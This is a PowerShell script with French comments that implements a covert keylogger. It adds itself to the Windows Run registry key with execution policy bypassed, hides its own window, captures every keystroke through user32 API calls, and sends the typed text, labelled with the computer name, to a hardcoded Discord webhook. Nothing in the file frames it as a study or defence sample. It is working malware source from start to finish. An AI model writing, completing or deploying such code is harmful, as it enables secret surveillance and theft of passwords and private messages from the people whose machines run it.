# Définir automatiquement le chemin du script dans le dossier Documents
$scriptPath = "$env:USERPROFILE\Documents\script.ps1"

# Ajouter le script au registre pour exécution au démarrage
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "MyStartupScript" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File $scriptPath"

# URL du webhook Discord
$dc = "https://discord.com/api/webhooks/1333181685000442000/m2DkAjyoscuYxvQEtWy4nEBhWQRjLwP6RxrJevz4gigLcVfH4nieIoEZKN6_tyWfcWDA"

# Masquer la fenêtre PowerShell
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
}

# Importer les définitions DLL pour capturer les touches du clavier
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Initialiser les variables globales
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
$send = ""  # Initialise une chaîne vide pour les frappes capturées
$logPath = "$env:USERPROFILE\Documents\log.txt"  # Fichier de log

# Fonction pour journaliser les événements
function Log-Message($message) {
    Add-Content -Path $logPath -Value "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss") - $message"
}

# Journaliser le démarrage du script
Log-Message "Le script a démarré."

# Boucle continue pour capturer les frappes
While ($true) {
    $keyPressed = $false
    try {
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++) {
                $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        $LString = $logchar.ToString()
                        if ($asc -eq 8) { $LString = "[BKSP]" }
                        if ($asc -eq 13) { $LString = "[ENT]" }
                        if ($asc -eq 27) { $LString = "[ESC]" }
                        $send += $LString
                    }
                }
            }
        }
    } catch {
        Log-Message "Erreur dans la capture des touches : $_"
    } finally {
        if ($keyPressed -and $send) {
            try {
                # Envoyer les données capturées au webhook
                $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
                $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
                $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ; "content" = $escmsg} | ConvertTo-Json -Depth 10
                Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
                Log-Message "Données envoyées : $send"
                $send = ""
            } catch {
                Log-Message "Erreur lors de l'envoi au webhook : $_"
            }
        }
    }
    # Réinitialiser le chronomètre
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}
